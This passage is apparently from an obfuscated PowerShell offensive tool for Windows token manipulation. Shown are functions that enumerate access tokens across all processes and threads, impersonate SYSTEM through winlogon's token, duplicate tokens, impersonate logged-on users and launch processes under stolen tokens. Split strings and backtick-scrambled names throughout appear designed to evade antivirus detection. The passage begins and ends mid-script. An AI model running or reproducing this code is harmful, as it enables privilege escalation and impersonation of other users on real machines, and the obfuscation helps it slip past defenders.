                        &("{2}{1}{0}"-f 'ning','ite-War','Wr') ('Get'+'Token'+'I'+'nf'+'ormatio'+'n '+'fa'+'iled '+'t'+'o '+'retrieve'+' '+'Tok'+'en '+'Sessi'+'onId'+'. '+'Erro'+'rC'+'od'+'e: '+"$ErrorCode")
                    }
                    else
                    {
                        [UInt32]${tO`KE`NSeSs`ION`Id} =  ( Dir variaBlE:y5MVl  ).vALUe::"PTR`TosT`R`UCtURe"(${toke`Ns`E`sSIONIDptR}, [Type][UInt32])
                        ${ReTURN`O`Bj}."S`eSSiOniD" = ${TOK`eNsES`s`ioNid}
                    }
                      ( GEt-vARiaBle  Y5mvL  -VaLueOnl )::("{0}{1}{3}{2}"-f 'Fr','eeHGl','al','ob').Invoke(${tOke`NSeSSio`N`I`D`PTr})


                    
                    ${rE`T`URNobJ} | &("{2}{0}{1}{3}"-f 'M','em','Add-','ber') -Type ("{0}{1}{2}"-f 'NoteP','ropert','y') -Name ("{1}{2}{5}{3}{4}{0}"-f'd','Pri','vileg','Ena','ble','es') -Value @()
                    ${ret`URN`obj} | &("{0}{3}{2}{1}"-f'A','ber','m','dd-Me') -Type ("{1}{0}{3}{2}"-f 'ot','N','y','ePropert') -Name ("{4}{5}{2}{3}{0}{1}" -f'a','ble','eg','esAvail','P','rivil') -Value @()

                    [UInt32]${to`K`EN`priVilEGeSsi`zE} = 1000
                    [IntPtr]${t`oKEnp`RiVIl`eg`esptR} =   $y5Mvl::("{1}{3}{2}{0}" -f 'lobal','All','G','ocH').Invoke(${t`O`KEn`PRivIlEGesSIZE})
                    [UInt32]${REa`Ls`IZe} = 0
                    ${sU`CC`ESS} = ${GetTok`eNi`NfoR`m`ATion}."IN`VoKE"(${H`TOkEN}, ${TOke`N`_inFor`Ma`TION_C`LasS}::"To`ke`NpRIVi`le`ges", ${tO`Ken`pRIvIle`g`eSPTr}, ${tOke`Npr`IVI`LEGeS`S`ize}, [Ref]${reAl`S`IZE})
                    if (-not ${succ`e`ss})
                    {
                        ${er`R`Or`COdE} =   (Get-chIldiTem  VaRiaBLe:y5mvL  ).vALUE::("{2}{3}{4}{0}{1}" -f'r','ror','GetLastWin','3','2E').Invoke()
                        &("{0}{1}{2}" -f'Write-War','nin','g') ('Get'+'TokenInfor'+'mat'+'i'+'o'+'n '+'failed'+' '+'to'+' '+'ret'+'rie'+'ve '+'Tok'+'en '+'Sess'+'ion'+'Id. '+'E'+'rr'+'orCode: '+"$ErrorCode")
                    }
                    else
                    {
                        ${to`KenP`RiVi`l`EG`Es} =  (  ChiLditEm  ("vARIAblE"+":y"+"5MV"+"L") ).ValuE::"P`T`RTost`R`UctuRe"(${t`OK`eNpR`IvIlEgespTR}, [Type]${TokEN`_P`RI`ViL`EgEs})
                        
                        
                        [IntPtr]${PrI`VIl`egES`BasEpTR} = [IntPtr](&("{5}{3}{2}{1}{0}{4}"-f 'gne','IntAsUnsi','ned','g','d','Add-Si') ${to`kenPrIv`i`LeGEsPTR} (  $Y5mvl::"OFF`seT`of"([Type]${tOKEN`_pri`VILE`g`Es}, ("{2}{0}{3}{1}" -f'il','s','Priv','ege'))))
                        ${lUIdaNDaTTR`Ib`U`TEsI`ze} =   (gEt-vaRiaBLe Y5Mvl).VALue::"s`IZ`eOf"([Type]${lUId`_ANd_A`TTRibUT`eS})
                        for (${i} = 0; ${i} -lt ${T`OKEn`PRiv`i`lEgEs}."PRi`Vi`LeGEC`ouNt"; ${i}++)
                        {
                            ${LUiDandaT`Tr`iB`Ut`EpTr} = [IntPtr](&("{0}{5}{4}{2}{1}{3}"-f'A','nsi','tAsU','gned','gnedIn','dd-Si') ${p`RIVi`lEgE`sbA`sEPtr} (${LU`idAndaTT`Ri`BUtESI`Ze} * ${I}))

                            ${l`UiDa`NDATt`R`ibUTE} =   $y5MvL::"Pt`R`To`stRucTure"(${Lu`i`DA`NdAtTR`ibUtEPTr}, [Type]${LuID`_`AND`_atTrib`Ut`Es})

                            
                            [UInt32]${privileG`EN`A`MeSIZE} = 60
                            ${pRi`ViLeG`enaM`EPTr} =  (gci ("varIABL"+"e"+":Y5MvL") ).VaLUe::("{2}{1}{0}"-f 'obal','llocHGl','A').Invoke(${P`RivIle`g`ENAMe`siZE})
                            ${pl`U`id} = ${L`U`Id`AND`Attri`BU`TeptR} 

                            ${Suc`ce`ss} = ${LOoku`pPrI`V`ILE`gEN`A`mew}."I`N`VOkE"(  $b8F4i::"Z`eRO", ${pL`U`Id}, ${pRiVi`l`eGEnA`mEPTR}, [Ref]${PRivIleGEnAM`e`Si`ZE})
                            if (-not ${sUCC`Ess})
                            {
                                ${e`RrorCO`De} =   (vArIAbLe  ("y"+"5MVl") ).VAlue::("{5}{1}{3}{4}{0}{2}" -f 'in32Err','t','or','Last','W','Ge').Invoke()
                                &("{0}{1}{2}"-f'Write-Wa','rnin','g') ('Cal'+'l '+'t'+'o '+'Lo'+'o'+'kupPriv'+'ile'+'geNameW '+'f'+'ai'+'led. '+'E'+'r'+'ror '+'c'+'ode'+': '+"$ErrorCode. "+'Re'+'alSiz'+'e: '+"$PrivilegeNameSize")
                            }
                            ${Pr`iV`I`LegEnA`me} =   (  VArIabLE  ('Y5'+'mVL')  ).ValUE::("{2}{1}{0}" -f 'oStringUni','T','Ptr').Invoke(${prI`VIL`EGENAMeP`Tr})

                            
                            ${pR`IVIleGesTa`Tus} = ""
                            ${EN`ABl`ed} = ${f`AlSe}

                            if (${lUId`AnDa`TtR`IBU`Te}."atT`R`I`BuTES" -eq 0)
                            {
                                ${E`NABL`ED} = ${f`AlSe}
                            }
                            if ((${lui`dAN`dAt`TRIb`UtE}."A`TtRi`BUTeS" -band ${WiN`3`2cOnSTA`N`TS}."SE`_PRivil`Ege_E`NaB`Led`_b`y_DE`FauLT") -eq ${w`IN32`con`STAnTS}."SE`_pRi`VILegE`_enableD_b`Y_`D`EFa`Ult") 
                            {
                                ${e`NaBlEd} = ${T`RUe}
                            }
                            if ((${l`UidaN`datTri`Bu`Te}."aT`TriBu`TES" -band ${w`iN`3`2conStaN`Ts}."se_p`RIvilE`ge_EnAB`lED") -eq ${wIN`32CON`s`TaNTs}."S`e_p`RiV`ILeg`e`_EnABLED") 
                            {
                                ${EnaB`l`ED} = ${t`RUE}
                            }
                            if ((${LuId`ANdatt`Rib`Ute}."atT`Ri`ButeS" -band ${win32c`O`NS`T`ANTs}."se_P`R`IVilEGe_Re`MOvEd") -eq ${wIN32`C`oNsta`N`TS}."sE_privILEg`E_`RE`Mo`VeD") 
                            {
                                &("{2}{1}{3}{4}{0}"-f 'g','ri','W','te-','Warnin') ("{24}{11}{0}{17}{6}{1}{4}{14}{12}{9}{10}{7}{19}{20}{13}{18}{16}{15}{26}{3}{22}{5}{23}{8}{2}{21}{25}"-f 'xp','d','s a','ase rep',' ',' th','te','PRIVI','s a',' a tok','en with SE_','ne','Found','M','behavior: ',' ','VED.','ec','O','LEGE','_RE',' bug.','ort','i','U',' ','Ple')
                            }

                            if (${eNaB`lED})
                            {
                                ${RE`TU`RNObJ}."PRivI`L`EGesEnAb`led" += ,${priviLEge`N`A`mE}
                            }
                            else
                            {
                                ${retuR`NO`BJ}."p`RIv`IlEG`e`s`AVaILa`BLE" += ,${pri`VILEG`EN`Ame}
                            }

                              ( GI vArIablE:y5MVL).value::("{2}{0}{1}"-f'eeHGl','obal','Fr').Invoke(${P`RIviLEgEN`A`MePtR})
                        }
                    }
                      ( vARIABlE  y5MVL ).VaLue::("{2}{0}{1}"-f'HGlob','al','Free').Invoke(${To`kEN`PrIVIL`eGeSpTr})

                }
                else
                {
                    &("{2}{0}{1}"-f 'ite-Verb','ose','Wr') "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length) "
                }

                
                ${n`TSTA`T`Us} = ${LsAfR`e`erE`Tur`N`B`UFfER}."I`NvOKe"(${L`og`oNSesSIOn`daT`Aptr})
                ${LOgO`NSE`S`sIoNdataP`TR} =  $B8f4I::"ZE`RO"
                if (${NtSt`At`Us} -ne 0)
                {
                    &("{2}{1}{0}{3}"-f 'n','ni','Write-War','g') ('Call'+' '+'t'+'o '+'Ls'+'a'+'FreeRe'+'tu'+'rnBuffer '+'failed.'+' '+'Er'+'r'+'or '+'code:'+' '+"$ntstatus")
                }
            }

             (  itEm ("variABlE"+":"+"Y5"+"MVL") ).vaLUe::("{1}{0}{2}" -f'G','FreeH','lobal').Invoke(${L`Uid`pTR})
            ${lu`IdP`Tr} =  $B8f4I::"ZE`Ro"
        }

         ( Get-vARIAbLe Y5MVL).vALuE::("{0}{1}{2}"-f 'Fr','eeH','Global').Invoke(${tOk`E`NstaTS`PtR})
        ${T`oK`eNSTa`T`sPTR} =   ( dir  VaRIabLe:B8F4i ).vaLUe::"zE`Ro"

        return ${RE`Tu`RNOBJ}
    }


    
    function G`ET-`UNiQUETO`k`Ens
    {
        Param(
            [Parameter(posITION=0, manDatoRy=${tR`UE})]
            [Object[]]
            ${aLl`Tok`Ens}
        )

        ${T`OKENBy`U`ser} = @{}
        ${To`KE`NBYENa`B`ledpriv} = @{}
        ${Toke`N`BYavAil`Ab`Lep`RiV} = @{}

        
        foreach (${TOK`En} in ${ALl`T`OKens})
        {
            ${K`EY} = ${TOK`En}."dOM`AIN" + "\" + ${t`Ok`En}."U`SE`RNaMe"
            if (-not ${toKen`B`yUSeR}.("{3}{2}{0}{1}"-f 'ain','sKey','nt','Co').Invoke(${K`EY}))
            {
                
                
                if (${T`Ok`EN}."LOG`ONty`pe" -ne 3 -and
                    ${T`OKen}."US`er`NAME" -inotmatch "^DWM-\d+$" -and
                    ${t`oK`en}."uS`erna`mE" -inotmatch "^LOCAL\sSERVICE$")
                {
                    ${TOKe`NByu`SeR}.("{0}{1}"-f'Ad','d').Invoke(${K`eY}, ${to`kEN})
                }
            }
            else
            {
                
                if(${to`KEN}."I`SEL`eVA`TeD" -eq ${TO`KE`NBy`UsEr}[${K`EY}]."IsElE`VAt`eD")
                {
                    if ((${T`O`Ken}."P`RiViLegESEN`Ab`L`Ed"."c`OuNt" + ${To`kEN}."P`R`iviLE`Ge`SavaI`l`ABLe"."co`UNt") -gt (${TOKE`NByU`sEr}[${K`ey}]."pRIVIle`g`EsENa`BLeD"."CO`Unt" + ${t`ok`eNBYUs`er}[${K`Ey}]."pRIVi`LEGesavAI`la`Ble"."C`OUnt"))
                    {
                        ${t`O`KENby`USeR}[${K`EY}] = ${t`oKen}
                    }
                }
                
                elseif ((${T`okEn}."ISElE`VaT`eD" -eq ${Tr`Ue}) -and (${t`okEn`ByU`sER}[${K`Ey}]."iSE`l`evaTed" -eq ${F`A`LsE}))
                {
                    ${toK`enb`YUsER}[${K`ey}] = ${To`ken}
                }
            }
        }

        
        foreach (${T`oK`en} in ${allT`O`ke`NS})
        {
            ${f`ULlna`mE} = "$($Token.Domain)\$($Token.Username)"

            
            foreach (${Pri`V`ile`Ge} in ${TOk`eN}."pri`Vi`LE`gESe`NabLed")
            {
                if (${tOKEn`BYeNa`B`lE`dPriv}.("{1}{0}{3}{2}"-f'n','Contai','ey','sK').Invoke(${p`R`IViLegE}))
                {
                    if(${TOKEnBYeN`A`Bl`E`dP`RiV}[${p`Rivi`lEge}] -notcontains ${FullN`A`mE})
                    {
                        ${tOk`enByEN`ABlEdP`RIv}[${PR`Iv`ILege}] += ,${f`UlLna`mE}
                    }
                }
                else
                {
                    ${tokEnbYenA`B`l`eDP`R`iv}.("{0}{1}"-f'A','dd').Invoke(${p`RIvi`lEGE}, @(${Full`N`AME}))
                }
            }

            
            foreach (${pRiv`iL`E`gE} in ${t`oKEN}."pr`ivIlEgeS`AVAiLA`BLE")
            {
                if (${TO`KEnb`y`AvaILA`Bl`eprIV}.("{0}{2}{1}"-f'C','y','ontainsKe').Invoke(${P`Ri`ViLeGE}))
                {
                    if(${to`K`enb`Ya`VaI`la`BLEPriV}[${p`RI`ViL`Ege}] -notcontains ${F`UL`lNAMe})
                    {
                        ${toKE`Nb`Y`AvAiLaBl`EpRiV}[${pr`i`VILegE}] += ,${f`Ul`lNaME}
                    }
                }
                else
                {
                    ${to`K`E`NBy`Ava`ILa`BlEPriV}.("{1}{0}" -f'dd','A').Invoke(${pr`IVIl`EGe}, @(${f`UlL`NaME}))
                }
            }
        }

        ${Ret`U`RnDiCt} = @{
            ("{1}{0}{2}"-f'nByUse','Toke','r') = ${to`ke`NByuS`ER}
            ("{0}{3}{2}{1}{4}" -f'TokenByEn','dPri','ble','a','v') = ${T`oKen`BYENAb`lEdPriV}
            ("{1}{3}{2}{0}" -f'riv','T','ByAvailableP','oken') = ${tokEN`BY`AvaI`L`AbLEp`Riv}
        }

        return (&("{0}{2}{1}"-f'N','Object','ew-') ("{1}{2}{0}"-f'ject','PSO','b') -Property ${retU`RN`dI`ct})
    }


    function InV`Oke-im`PE`R`soNaTEuSEr
    {
        Param(
            [Parameter(posiTiON=0, mAnDaTory=${TR`UE})]
            [IntPtr]
            ${ht`ok`eN}
        )

        
        [IntPtr]${N`ewHT`okEN} =  (geT-ChIldITEM  ('var'+'IABL'+'E:B8f'+'4i')  ).vALue::"Ze`Ro"
        ${S`U`CceSs} = ${du`PLIcAt`e`ToK`Enex}."iN`V`Oke"(${H`TokEn}, ${WIn32Con`STa`N`TS}."MA`X`IMUm_aLLo`wED",  $B8f4I::"Z`ero", 3, 1, [Ref]${NeWH`TO`k`En}) 
        if (-not ${su`CcE`ss})
        {
            ${E`RrOR`coDe} =   (  gET-itEM  VaRIABlE:Y5mvL).VALue::("{3}{0}{2}{1}"-f'tW','r','in32Erro','GetLas').Invoke()
            &("{2}{3}{0}{1}"-f 'e','-Warning','Wri','t') ('D'+'up'+'lica'+'teTokenEx '+'f'+'ailed'+'. '+'Err'+'orC'+'ode: '+"$ErrorCode")
        }
        else
        {
            ${sUC`cesS} = ${IM`PErS`OnATEL`OGGe`DON`USEr}."in`V`oke"(${N`e`w`hTOKEN})
            if (-not ${su`C`cEsS})
            {
                ${ER`R`ORc`Ode} =  ( GeT-VAriabLe  Y5MVl  ).VALuE::("{4}{0}{3}{1}{2}" -f'as','Win32Erro','r','t','GetL').Invoke()
                &("{1}{3}{0}{2}" -f'e-','W','Warning','rit') ('Fai'+'l'+'ed '+'t'+'o '+'Imp'+'ers'+'onat'+'e'+'L'+'oggedOnUser'+'. '+'Erro'+'r '+'c'+'od'+'e: '+"$Errorcode")
            }
        }

        ${s`UCCe`ss} = ${c`loSeHA`N`dLE}."in`Vo`kE"(${neWHt`ok`en})
        ${NE`wHTOK`En} =   ( VarIABLe ("b8F4"+"i")  -VAlueo)::"Z`eRo"
        if (-not ${suc`Ce`SS})
        {
            ${e`R`ROrcOde} =   (VARiaBLE  ("Y5"+"mVL")).vAluE::("{3}{2}{1}{0}{4}"-f 'in32E','stW','La','Get','rror').Invoke()
            &("{2}{1}{0}" -f '-Warning','e','Writ') ('C'+'loseH'+'andle '+'fail'+'ed '+'t'+'o '+'c'+'l'+'ose '+'NewHToke'+'n.'+' '+'Er'+'r'+'orCo'+'de: '+"$ErrorCode")
        }

        return ${Su`CCeSS}
    }


    function CREa`Te`-`pr`oCesswI`T`hTok`EN
    {
        Param(
            [Parameter(PosiTioN=0, manDaToRy=${TR`Ue})]
            [IntPtr]
            ${h`TOk`En},

            [Parameter(posiTiOn=1, mANdATOrY=${t`RuE})]
            [String]
            ${pr`oCES`sN`AmE},

            [Parameter(PoSItIOn=2)]
            [String]
            ${p`RocEs`Sar`gs},

            [Parameter(poSItiON=3)]
            [Switch]
            ${pASst`h`RU}
        )
        &("{3}{2}{1}{0}" -f 'rbose','Ve','rite-','W') ("{3}{5}{4}{1}{6}{2}{0}" -f'ssWithToken','at','e','Ente','ing Cre','r','e-Proc')
        
        [IntPtr]${NeWH`T`o`ken} =   $B8f4i::"Ze`Ro"
        ${Suc`c`ESS} = ${DUPlIc`ATEt`oKe`NEX}."INv`Oke"(${HTok`eN}, ${WiN32CO`NS`TAnTs}."m`AximU`m`_alL`OwEd",   $B8F4i::"z`eRo", 3, 1, [Ref]${NeWHT`O`KEN})
        if (-not ${SucC`e`SS})
        {
            ${e`RRO`RcOde} =  $y5mvl::("{1}{2}{5}{3}{0}{4}" -f 'rr','GetLas','tW','32E','or','in').Invoke()
            &("{1}{0}{3}{2}" -f'it','Wr','g','e-Warnin') ('Duplic'+'a'+'teTokenEx'+' '+'f'+'ailed.'+' '+'E'+'rro'+'rCode: '+"$ErrorCode")
        }
        else
        {
            ${sTAr`TupINFOsI`zE} =   ( get-variABlE  ('Y5'+'mvl') ).ValuE::"S`IZeOF"([Type]${STaR`T`Up`INfo})
            [IntPtr]${ST`ArTUPin`FOptR} =   $y5MvL::("{2}{0}{1}" -f'HGlob','al','Alloc').Invoke(${sTaRt`UPI`NFOS`I`ze})
            ${m`EMsET}."INv`Oke"(${s`Ta`RTupIN`FOPtr}, 0, ${sTaRtuPI`N`FO`SIZE}) | &("{2}{0}{1}" -f 'ut-','Null','O')
              (GEt-vARIAbLE y5MVL).VAlUE::("{1}{2}{0}" -f'teInt32','W','ri').Invoke(${ST`AR`TUpinFoPTr}, ${STa`Rt`UpinfosI`ze}) 

            ${PR`ocE`SsIN`FOsI`ze} =  ( geT-cHIldiTeM  ('Va'+'RIa'+'BLE:y5mvL')).VaLUE::"sIZe`oF"([Type]${pRo`cE`SS_InFoR`MaTION})
            [IntPtr]${pRoCe`SsIN`FOp`TR} =  (  GI  ("VARIa"+"B"+"LE:Y5M"+"Vl") ).vALUe::("{1}{2}{3}{0}" -f 'l','Alloc','HGlob','a').Invoke(${ProCES`Si`NFO`SI`zE})

            ${PRO`c`Ess`NaM`eptR} =  $Y5Mvl::("{3}{1}{4}{0}{2}{5}" -f'l','trin','ob','S','gToHG','alUni').Invoke("$ProcessName")
            ${pr`O`ces`SArg`SpTr} =  $B8F4I::"ze`RO"
            if (-not   ( iTem  ("VARiA"+"b"+"le"+":aejp") ).vALUE::("{1}{0}{2}" -f'sNullOrE','I','mpty').Invoke(${pROc`ESsAR`Gs}))
            {
                ${pRO`cESSAr`GsP`TR} =   ( get-itEm VARIaBle:Y5MvL  ).vALUe::("{0}{2}{1}{4}{3}"-f'StringTo','a','HGlob','ni','lU').Invoke(("`"$ProcessName`" "+"$ProcessArgs"))
            }
            
            ${Fu`Nc`TIOnnamE} = ""
            if (  $HvYQ::("{0}{1}{4}{5}{3}{2}" -f 'Get','Curre','ess','Proc','n','t').Invoke()."sE`SSi`ONid" -eq 0)
            {
                
                
                
                &("{3}{1}{2}{0}"-f 'e','rite','-Verbos','W') ("{14}{2}{20}{24}{1}{9}{35}{29}{7}{18}{23}{13}{26}{17}{16}{19}{6}{3}{33}{25}{5}{31}{37}{32}{11}{8}{22}{34}{27}{15}{38}{12}{30}{28}{10}{4}{36}{21}{0}"-f 'te token.',' in S','u','ege a',' ','ng','l','l','e','ession','s','roc','c','ssi','R','rW to','ok','rimaryT','ing Se','enPrivi','n','erna','s','A','ning','lli','gnP','AsUse','s','0. Enab','e',' Cre','P','nd ca','s',' ','with alt','ate',' create a pro')
                &("{2}{0}{1}" -f 'ble-Privi','lege','Ena') -Privilege ("{0}{2}{6}{5}{1}{3}{4}{7}"-f'S','g','e','nPrimaryToke','nPr','si','As','ivilege')
                ${suc`c`eSS} = ${c`Reat`eProcES`s`A`sUSeRW}."In`Voke"(${n`EWhtO`k`eN}, ${PrOCe`S`sNaM`e`PTR}, ${pr`O`cessaR`GSp`TR},   (DIR  ("vAr"+"iA"+"BLe:B"+"8f4"+"I")  ).ValUE::"zE`Ro",   ( ItEm  vARiaBlE:B8f4i).ValuE::"z`ERo", ${Fa`l`se}, 0,  $b8f4I::"zE`RO",   ( Get-VariABLe  ("B"+"8f4I")  ).vAlue::"Ze`Ro", ${S`TaRTUp`i`Nf`OPtR}, ${P`R`OCESsIn`FOptR})
                ${f`Un`CTio`Nname} = ("{0}{4}{2}{5}{6}{1}{3}" -f'C','essAs','ate','UserW','re','Pro','c')
            }
            else
            {
                &("{3}{2}{4}{1}{0}" -f'e','s','te-Ver','Wri','bo') ("{12}{10}{1}{18}{28}{4}{7}{25}{5}{11}{22}{19}{24}{23}{21}{2}{17}{9}{14}{0}{15}{8}{3}{20}{6}{27}{26}{13}{16}"-f 'enW to creat','i','e','c','sio',' c',' a','n ','ro','sWit',' ','a','Not running','oke','hTok','e a p','n.','s','n ','g C','ess with','Proc','llin','eate','r','0,','ate t','ltern','Ses')
                ${sUCC`e`ss} = ${c`REAte`pRoc`eSs`wiTHT`OkENw}."I`Nv`oKe"(${nEWH`TOk`en}, 0x0, ${PrOCe`SS`Na`m`eptR}, ${p`ROCes`sAR`GspTr}, 0,  ( Gci  VAriABlE:b8F4i).VALue::"ZE`Ro",   (  gcI ("vAri"+"AB"+"lE:"+"b8F4"+"I")).vAluE::"Ze`Ro", ${STA`R`TuPIn`FoPTr}, ${P`ROCeS`sin`FOpTR})
                ${FUNc`T`IonNa`Me} = ("{2}{3}{1}{4}{0}"-f'ithTokenW','c','C','reatePro','essW')
            }
            if (${S`UCce`SS})
            {
                
                ${PRo`C`eS`siNFO} =  $y5mvl::"pTr`ToStr`UCtU`RE"(${pRoceS`SiNfo`pTr}, [Type]${Pr`oc`eSs_IN`F`O`RMAtI`oN})
                ${c`lO`seHAnd`LE}."i`N`Voke"(${PROC`E`SsI`NfO}."hPROC`E`ss") | &("{2}{1}{0}"-f 'l','-Nul','Out')
                ${cL`OS`e`HANDlE}."in`VO`KE"(${prOCe`ssi`N`FO}."hT`HrEad") | &("{2}{1}{0}" -f 'l','l','Out-Nu')

		
		if (${PAss`T`HRU}) {
			
			${Re`TuRn`procesS} = &("{1}{3}{0}{2}" -f'-Proc','G','ess','et') -Id ${pROcE`SSIn`Fo}."dwP`RO`Cessid"

			
			${N`ULL} = ${RE`TUrNpr`Oc`esS}."hA`NDlE"

			
			${rETu`RNp`R`ocess}
		}
            }
            else
            {
                ${eRr`orco`de} =  (VaRiabLE  ('Y'+'5MVL')  -ValUeON)::("{0}{3}{2}{1}"-f 'GetLastWin32','r','o','Err').Invoke()
                &("{0}{3}{1}{2}" -f'Write','Warni','ng','-') ("$FunctionName "+'f'+'aile'+'d. '+'E'+'rror '+'code:'+' '+"$ErrorCode")
            }

            
             ( gEt-itEM  variAbLe:Y5mVL ).VAlUE::("{0}{3}{1}{2}"-f'Fr','Gl','obal','eeH').Invoke(${St`A`RT`U`PInFOPTR})
            ${STA`R`TupiNfO`p`TR} =  $b8F4I::"z`ErO"
              $y5MVL::("{1}{0}{3}{2}"-f 'HGl','Free','al','ob').Invoke(${pRo`C`eSsINfo`pTr})
            ${PRoCEs`S`I`NFoptr} =   (  vARiaBLe  ("B"+"8f4i") -val )::"Ze`RO"
              (  VarIABLE  ("Y5M"+"Vl")).vAlUe::("{2}{4}{7}{3}{1}{5}{6}{0}" -f'ode','A','Zer','eeGlobal','oF','llocUni','c','r').Invoke(${pr`o`C`EssnaMePtR})
            ${p`ROc`EsSNAMe`ptr} =   (  GET-childitem  variablE:B8F4i  ).vALUe::"z`eRo"

            
            ${SUC`CE`Ss} = ${cLOse`HA`NdLe}."i`NV`Oke"(${NE`WHToK`En})
            ${NE`W`Ht`okEN} =  (Get-vaRIabLe  ("b8F4"+"I") ).VALUe::"ze`Ro"
            if (-not ${SU`Cc`EsS})
            {
                ${e`R`ROrcODe} =  $y5mVL::("{5}{3}{4}{2}{1}{0}"-f 'r','ro','Er','n','32','GetLastWi').Invoke()
                &("{2}{0}{1}" -f 'te-War','ning','Wri') ('Clos'+'eHan'+'dle '+'f'+'a'+'iled '+'to'+' '+'clos'+'e '+'N'+'ewH'+'T'+'oken. '+'Er'+'ro'+'rCode: '+"$ErrorCode")
            }
        }
    }


    function freE-`ALl`TokeNS
    {
        Param(
            [Parameter(POsiTIoN=0, ManDAtory=${T`RUe})]
            [PSObject[]]
            ${TO`kEninfoo`BJS}
        )

        foreach (${O`BJ} in ${tO`KENi`NfOo`B`js})
        {
            ${s`UcCe`SS} = ${Cl`osE`HanD`le}."I`NvoKE"(${O`BJ}."Ht`oKeN")
            if (-not ${su`c`CeSs})
            {
                ${ER`RoRC`ODE} =  (Ls VArIaBLE:Y5MVL).vAlUe::("{4}{3}{0}{2}{1}" -f '3','rror','2E','etLastWin','G').Invoke()
                &("{1}{0}{2}" -f 'rite-V','W','erbose') ('F'+'ai'+'led '+'t'+'o '+'clo'+'se '+'to'+'ken'+' '+'hand'+'le '+'in'+' '+'Fre'+'e-AllTok'+'ens'+'.'+' '+'Error'+'C'+'od'+'e: '+"$ErrorCode")
            }
            ${O`BJ}."HtOk`EN" =  $b8F4i::"Z`eRo"
        }
    }


    
    function eN`UM-a`ll`TOKENS
    {
        ${aL`ltoK`e`NS} = @()

        
        
        ${s`Y`S`TeM`TokenINfo} = &("{1}{2}{0}" -f 'yToken','Get-Pri','mar') -ProcessId (&("{1}{2}{3}{0}" -f 'ss','G','et-Proc','e') ("{1}{2}{0}" -f 't','wi','nini') | &("{0}{1}" -f 'w','here') {${_}."SEs`S`ioN`id" -eq 0})."Id"
        if (${SY`ST`emt`oKen`inFO} -eq ${n`ULL} -or (-not (&("{2}{5}{3}{4}{0}{1}"-f 'teU','ser','Invo','Im','persona','ke-') -hToken ${sysT`EMTOK`eN`iNFO}."HpRO`cT`OKEN")))
        {
            &("{1}{3}{2}{0}" -f'g','Writ','Warnin','e-') ("{18}{5}{4}{2}{1}{12}{11}{6}{8}{3}{14}{0}{9}{10}{17}{7}{16}{13}{15}"-f 'abl','e SYST','rsonat',' not be',' to impe','ble','pt wi','ate a','ll','e to',' e','he scri','EM, t','ke',' ','ns','ll to','numer','Una')
        }

        if (${s`ySte`M`ToK`enINFO} -ne ${N`Ull} -and ${SysTEmT`OK`ENiNfo}."H`pRoC`ToKen" -ne  $B8F4I::"Z`eRo")
        {
            ${clo`se`Handle}."i`Nv`OkE"(${S`Y`stEMtoke`NINFo}."H`prOCTO`kEn") | &("{1}{0}{2}" -f'Nul','Out-','l')
            ${s`yS`T`eMto`keNINFo} = ${N`Ull}
        }

        ${ProCE`s`sIDs} = &("{0}{1}{2}" -f 'g','et-proc','ess') | &("{1}{0}"-f're','whe') {${_}."N`AME" -inotmatch "^csrss$" -and ${_}."N`Ame" -inotmatch "^system$" -and ${_}."I`D" -ne 0}

        
        foreach (${pR`oCESS} in ${P`ROc`E`sSIDS})
        {
            ${PRIMaRYtOk`eN`IN`Fo} = (&("{0}{1}{3}{2}"-f 'Get-Pr','ima','ken','ryTo') -ProcessId ${p`Ro`CEsS}."i`D" -FullPrivs)

            
            if (${P`RImaRyT`OK`ENIn`Fo} -ne ${n`Ull})
            {
                [IntPtr]${ht`o`kEN} = [IntPtr]${priMary`TOK`eNI`NfO}."hPRO`ctOk`eN"

                if (${hT`oKen} -ne  (  cHilditEM vARIABLE:b8F4I  ).Value::"Ze`Ro")
                {
                    
                    ${re`T`UrnOBJ} = &("{1}{5}{4}{0}{2}{3}" -f 'nfo','Get-Toke','r','mation','I','n') -hToken ${htO`KEN}
                    if (${r`EtUR`NObJ} -ne ${Nu`LL})
                    {
                        ${r`et`U`RnobJ} | &("{1}{2}{0}{3}"-f '-M','Ad','d','ember') -MemberType ("{1}{2}{0}" -f'rty','Note','Prope') -Name ("{2}{1}{0}"-f'Id','s','Proces') -Value ${PR`OcEss}."i`D"

                        ${alL`TO`keNS} += ${RETu`R`NoBj}
                    }
                }
                else
                {
                    &("{0}{1}{2}{3}" -f'Writ','e-W','a','rning') "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id) "
                }

                foreach (${thRe`AD} in ${Pr`OceSS}."tHrEA`Ds")
                {
                    ${TH`RE`AdTO`kenI`Nfo} = &("{2}{0}{1}{3}"-f 'ead','T','Get-Thr','oken') -ThreadId ${thre`Ad}."I`d"
                    [IntPtr]${HtOk`en} = (${t`Hre`ADtokEN`infO}."hTH`ReaD`TOKEN")

                    if (${Hto`Ken} -ne   $B8f4i::"ze`Ro")
                    {
                        ${R`eturnO`BJ} = &("{2}{3}{1}{0}" -f'tion','ma','G','et-TokenInfor') -hToken ${hT`oKEn}
                        if (${RE`T`URnobJ} -ne ${nU`LL})
                        {
                            ${r`eturnO`Bj} | &("{0}{1}{2}" -f'Add-M','embe','r') -MemberType ("{0}{3}{2}{1}" -f 'NoteP','ty','r','rope') -Name ("{1}{0}" -f 'Id','Thread') -Value ${t`hREaD}."ID"
                    
                            ${AL`l`TokENs} += ${rET`U`RnO`BJ}
                        }
                    }
                }
            }
        }

        return ${aLL`ToK`enS}
    }


    function InVO`ke-R`EVe`RTtOsELf
    {
        Param(
            [Parameter(poSitION=0)]
            [Switch]
            ${S`hOWO`U`TPuT}
        )

        ${succ`ESS} = ${R`eveR`TtOsELf}."Invo`kE"()

        if (${sh`oWO`U`TPUt})
        {
            if (${SUcC`e`Ss})
            {
                &("{0}{2}{1}{3}" -f'Write-','s','Ho','t') "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }
            else
            {
                &("{1}{3}{0}{2}"-f'o','Write','st','-H') "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }
        }
    }


    
    function M`AIn
    {   
        
        if (  (  ITem  ('vArIa'+'B'+'lE:Hv'+'YQ') ).VAlue::("{5}{0}{2}{4}{1}{3}"-f 'ur','c','rentP','ess','ro','GetC').Invoke()."seSSio`N`ID" -eq 0)
        {
